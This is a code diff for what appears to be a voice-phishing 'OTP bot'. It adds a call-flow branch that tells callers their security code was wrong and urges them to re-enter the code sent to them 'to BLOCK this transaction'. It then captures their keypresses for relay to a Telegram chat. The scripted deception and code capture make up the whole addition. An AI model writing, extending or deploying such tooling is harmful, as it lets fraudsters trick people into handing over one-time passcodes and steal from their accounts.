@@ -919,6 +919,52 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
     });
   }
 
+  if (dtmf.length < 4) {
+    return res.json({
+      id: uuidv4(),
+      title: `call ${step} - ${chatId} OTP`,
+      record: false,
+      steps: [
+        {
+          id: uuidv4(),
+          action: 'say',
+          options: {
+            payload:
+              'The SECURITY CODE you have entered is incorrect. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key',
+            language,
+            voice: 'female',
+            loop: true,
+          },
+          onKeypressGoto: 'nextStepOTP',
+          endKey: '#',
+          maxNumKeys: 8,
+          onKeypressVar: 'dtmf',
+        },
+        {
+          id: uuidv4(),
+          action: 'pause',
+          options: {
+            length: 5,
+          },
+          onKeypressGoto: 'nextStepOTP',
+          onKeypressVar: 'dtmf',
+          endKey: '#',
+          maxNumKeys: 8,
+        },
+        {
+          action: 'hangup',
+        },
+        {
+          id: 'nextStepOTP',
+          action: 'fetchCallFlow',
+          options: {
+            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}`,
+          },
+        },
+      ],
+    });
+  }
+
   if (dtmf && dtmf === '*') {
     await bot.telegram.sendMessage(chatId, `OTP not received ❌`);
 
